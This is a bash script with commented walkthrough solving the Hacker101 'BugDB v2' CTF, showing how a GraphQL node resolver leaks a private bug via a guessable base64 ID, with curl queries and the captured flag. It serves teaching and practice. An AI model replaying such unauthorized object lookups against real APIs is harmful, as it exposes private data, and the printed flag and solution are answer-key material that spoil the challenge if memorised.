#!/usr/bin/env bash

set -euo pipefail

# Challenge: BugDB v2
# Platform: Hacker101 / HackerOne CTF
# Category: Web, GraphQL
# Difficulty shown: Easy
#
# Target:
#   https://ff7015c75297ab7130039b0b26bb9faf.ctf.hacker101.com/
#
# What this challenge teaches:
#   GraphQL can hide insecure direct object reference issues behind "safe-looking"
#   top-level queries. A list endpoint may filter private records correctly, while
#   a generic object fetcher like node(id: ...) still exposes the same object.
#
# Real-world analogy:
#   Think of a helpdesk app that hides private tickets from the main dashboard.
#   That looks good in the UI, but if the backend also offers a universal
#   "fetch object by internal ID" function and forgets authorization there,
#   anyone who can guess or derive the ID can still open the private ticket.
#
# Vulnerability summary:
#   1. The GraphQL schema supports Relay-style global object lookups with:
#        node(id: ID!)
#   2. Public listings do not show the victim's private bug in allBugs.
#   3. User and bug IDs follow a predictable base64 format:
#        "Users:1" -> VXNlcnM6MQ==
#        "Bugs:2"  -> QnVnczoy
#   4. Querying node(id:"QnVnczoy") returns the private bug object directly,
#      including its text field, which contains the flag.
#
# Why this matters in real systems:
#   GraphQL resolvers need authorization checks on every path to sensitive data.
#   It is not enough to protect only list endpoints. Global node resolvers are
#   especially risky because they provide a universal access path once IDs are
#   known or guessable.
#
# Manual discovery flow:
#
# Step 1: Confirm the GraphQL endpoint exists.
# Command:
#   curl -s 'https://ff7015c75297ab7130039b0b26bb9faf.ctf.hacker101.com/graphql?query=%7B__typename%7D'
# Reason:
#   This confirms the endpoint is alive and processing GraphQL queries.
#
# Step 2: Enumerate visible users.
# Command:
#   curl -sG 'https://ff7015c75297ab7130039b0b26bb9faf.ctf.hacker101.com/graphql' \
#     --data-urlencode 'query=query{allUsers(first:10){edges{node{id username}}}}'
# Reason:
#   This shows the known users and their global IDs. In this challenge we learn
#   there are admin and victim users.
#
# Step 3: Check the public bug list.
# Command:
#   curl -sG 'https://ff7015c75297ab7130039b0b26bb9faf.ctf.hacker101.com/graphql' \
#     --data-urlencode 'query=query{allBugs{id text private reporter{username}}}'
# Reason:
#   This shows that only the public bug is listed, which hints that a private
#   bug likely exists but is filtered from the list view.
#
# Step 4: Abuse the global node resolver with a guessed Relay ID.
# Command:
#   curl -sG 'https://ff7015c75297ab7130039b0b26bb9faf.ctf.hacker101.com/graphql' \
#     --data-urlencode 'query=query{node(id:"QnVnczoy"){__typename ... on Bugs{id text private reporter{username}}}}'
# Reason:
#   "QnVnczoy" is base64 for "Bugs:2". The node resolver returns the object even
#   though it is private, leaking the bug text and the flag.
#
# Helper note:
#   If you want to derive the ID yourself on Linux, this command generates it:
#     printf 'Bugs:2' | base64
#
# One-shot behavior:
#   Running this script performs the safe read-only node query and prints only
#   the flag. It does not modify the challenge state.

TARGET='https://ff7015c75297ab7130039b0b26bb9faf.ctf.hacker101.com/graphql'
QUERY='query{node(id:"QnVnczoy"){__typename ... on Bugs{id text private reporter{username}}}}'

response="$(
  curl -sG "$TARGET" \
    --data-urlencode "query=$QUERY"
)"

printf '%s\n' "$response" | python3 -c '
import json, re, sys
data = json.load(sys.stdin)
text = data["data"]["node"]["text"]
match = re.search(r"\^FLAG\^[^^$]+?\$FLAG\$", text)
if not match:
    raise SystemExit("flag not found in response")
print(match.group(0))
'

# Final flag obtained:
# ^FLAG^1df18c43cee76b3a8f764f10f669f77699a06666d58bb29b80edfa06f5e41e30$FLAG$
